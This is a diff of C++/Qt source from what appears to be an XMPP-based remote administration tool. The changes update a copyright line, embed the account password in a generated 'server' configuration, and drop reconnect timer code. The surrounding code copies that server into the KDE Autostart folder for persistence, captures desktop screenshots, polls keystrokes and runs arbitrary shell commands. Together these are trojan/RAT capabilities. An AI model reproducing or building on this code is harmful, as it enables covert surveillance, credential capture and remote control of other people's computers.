@@ -1,5 +1,5 @@
 /*
- *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
+ *  Copyright (C) 2011 Alberto Pajuelo Montes <paju1986@gmail.com>
  *
  *  This program is free software; you can redistribute it and/or modify
  *  it under the terms of the GNU General Public License as published by
@@ -63,10 +63,9 @@ void MainWindow::inicio(){
     manager = new QXmppTransferManager;
     connect(manager,SIGNAL(fileReceived(QXmppTransferJob*)),this,SLOT(llegadaDatosArchivo(QXmppTransferJob*)));
     cliente.addExtension(manager);
-    QString conversion;
     QByteArray datos; //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
     datos = "|@|" + this->cuentaXmpp.toLatin1() + "|@|";
-    datos = datos + conversion.toLatin1() + "|@|";
+    datos = datos + this->contrasena.toLatin1() + "|@|";
     datos = datos + this->alias.toLatin1() + "|@|";
     datos = datos + "nounido" + "|@|";
     datos = datos + "0" + "|@|";
@@ -95,7 +94,6 @@ void MainWindow::inicio(){
         copiarServidor(datos,QDir::homePath() + "/.kde/Autostart/" + this->nombreCopiable);
     }
     #endif
-    temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexiÃ³n
     connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
     connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
     connect(&cliente,SIGNAL(messageReceived(const QXmppMessage&)),this,SLOT(llegadaDatos(const QXmppMessage&)));
@@ -512,11 +510,7 @@ QPixmap MainWindow::screenShot(){
     captura = QPixmap::grabWindow(QApplication::desktop()->winId());
     return captura;
 }
-void MainWindow::desconectado() {
-    /** cosas que hacer al desconectarse **/
-    temporizador.start(this->tiempoConexion);
-    apagar(); //Si se desconecta y la webcam estaba encendida es mejor apagarla.
-}
+
 QString MainWindow::shell(QString comando){
     /** Función que ejecuta el comando de consola pasado como parámetro y devuelve la salida **/
     #ifdef Q_WS_WIN
